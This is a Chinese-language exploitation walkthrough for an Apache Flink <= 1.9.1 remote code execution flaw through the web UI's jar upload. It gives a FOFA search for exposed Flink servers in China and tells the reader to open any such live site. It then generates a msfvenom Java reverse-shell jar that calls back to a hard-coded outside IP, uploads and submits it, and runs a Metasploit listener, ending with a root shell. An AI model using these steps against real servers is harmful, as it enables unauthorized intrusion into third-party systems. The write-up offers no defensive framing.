# Apache Flink <= 1.9.1(最新版本) 远程代码执行

## FOFA

```fofa
FOFA 语句
app="Apache-Flink" && country="CN"
```

![](http://peiqi-boke.oss-cn-zhangjiakou.aliyuncs.com/poc-fuxian/Apache%20Flink/flink-1.png)

国内还是很多使用 `Apache Flink` 的，大概有1000的数量左右

## 漏洞复现

随便打开一个使用 Apache Flink 的网站，打开后页面为这样子

![](http://peiqi-boke.oss-cn-zhangjiakou.aliyuncs.com/poc-fuxian/Apache%20Flink/flink-2.png)

点击查看文件上传页面

![](http://peiqi-boke.oss-cn-zhangjiakou.aliyuncs.com/poc-fuxian/Apache%20Flink/flink-3.png)



打开MSF 生成一个 jar 木马

```shell
msfvenom -p java/meterpreter/reverse_tcp LHOST=39.99.135.123  LPORT=4444 -f jar > test.jar
```

点击 Add 上传 jar 文件

![](http://peiqi-boke.oss-cn-zhangjiakou.aliyuncs.com/poc-fuxian/Apache%20Flink/flink-4.png)

监听端口

```shell
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload java/shell/reverse_tcp
payload => java/shell/reverse_tcp
msf6 exploit(multi/handler) > set lhost xxx.xxx.xxx.xxx
lhost => xxx.xxx.xxx.xxx
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > run
```

![](http://peiqi-boke.oss-cn-zhangjiakou.aliyuncs.com/poc-fuxian/Apache%20Flink/flink-6.png)

点击下 submit 

![](http://peiqi-boke.oss-cn-zhangjiakou.aliyuncs.com/poc-fuxian/Apache%20Flink/flink-5.png)

反弹回来一个root 权限shell

![](http://peiqi-boke.oss-cn-zhangjiakou.aliyuncs.com/poc-fuxian/Apache%20Flink/flink-7.png)